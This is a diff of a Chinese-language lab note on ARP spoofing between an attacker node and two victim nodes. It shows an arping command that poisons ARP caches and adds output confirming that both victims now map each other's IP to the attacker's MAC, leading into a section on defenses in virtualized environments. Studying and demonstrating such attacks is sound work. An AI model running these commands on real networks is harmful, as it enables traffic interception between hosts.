@@ -35,10 +35,16 @@ node02    172.172.172.102     Victim02
 [root@node00 ~] arping -A -I eth0 -s 172.172.172.102 172.172.172.101 &
 
 经过上述arp poisoning:
-[root@node00 ~] 
-172.172.172.102的arp cache中保存 172.172.172.101 <Attacker MAC> 的对应关系;
+[root@node00 ~] ip -o link show eth0 | awk '{print $15}'
+52:54:00:a3:7d:ad
 
-172.172.172.101的arp cache中保存 172.172.172.102 <Attacker MAC> 的对应关系;
+(1)172.172.172.102的arp cache中保存 172.172.172.101 <Attacker MAC> 的对应关系;
+[root@node02 ~] arp -a | grep 172.172.172.101
+? (172.172.172.101) at 52:54:00:a3:7d:ad [ether] on eth0
+
+(2)172.172.172.101的arp cache中保存 172.172.172.102 <Attacker MAC> 的对应关系;
+[root@node01 ~] arp -a | grep 172.172.172.102
+? (172.172.172.102) at 52:54:00:a3:7d:ad [ether] on eth0
 
 虚拟化环境中对arp spoofing攻击的防御
 
